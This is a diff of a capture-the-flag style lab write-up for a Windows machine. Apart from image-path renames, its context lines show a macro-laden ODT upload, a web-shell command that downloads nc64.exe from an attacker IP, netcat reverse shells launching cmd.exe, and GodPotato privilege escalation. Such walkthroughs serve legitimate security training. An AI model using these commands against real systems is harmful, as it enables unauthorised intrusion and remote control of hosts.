@@ -18,15 +18,15 @@ PORT   STATE SERVICE
 
 The HTTP site was a Lorem Ipsum website:
 
-![](<../../../.gitbook/assets/image%20(1837).png>)
+![](../../../.gitbook/assets/craft-1.png)
 
 If we scroll down, we can see that there is a file upload for our 'resume'.
 
-![](<../../../.gitbook/assets/image%20(3098).png>)
+![](../../../.gitbook/assets/craft-3.png)
 
 I tried to upload an image, and this triggered an error:
 
-![](<../../../.gitbook/assets/image%20(686).png>)
+![](../../../.gitbook/assets/craft-5.png)
 
 An ODT file is similar to a Microsoft Word document, which can be created using `libreoffice`. Seeing that we can only upload ODT files, this machine might have a script opening the files and being able to trigger some macros embedded within the file.
 
@@ -84,7 +84,7 @@ Active sessions
 
 Resume this sesison to drop into our shell:
 
-![](<../../../.gitbook/assets/image%20(955).png>)
+![](../../../.gitbook/assets/craft-6.png)
 
 ## Privilege Escalation
 
@@ -138,7 +138,7 @@ $ curl -G --data-urlencode 'cmd=powershell -c wget 192.168.45.197/nc64.exe -Outf
 $ curl -G --data-urlencode 'cmd=C:/Windows/Tasks/nc.exe -e cmd.exe 192.168.45.197 21' http://192.168.197.169/cmd.php
 ```
 
-![](<../../../.gitbook/assets/image%20(3938).png>)
+![](../../../.gitbook/assets/craft-4.png)
 
 ### SeImpersonatePrivilege
 
@@ -166,6 +166,6 @@ We can use `godpotato.exe` to exploit this:
 C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.197 21"
 ```
 
-![](<../../../.gitbook/assets/image%20(2055).png>)
+![](../../../.gitbook/assets/craft-2.png)
 
 Rooted!
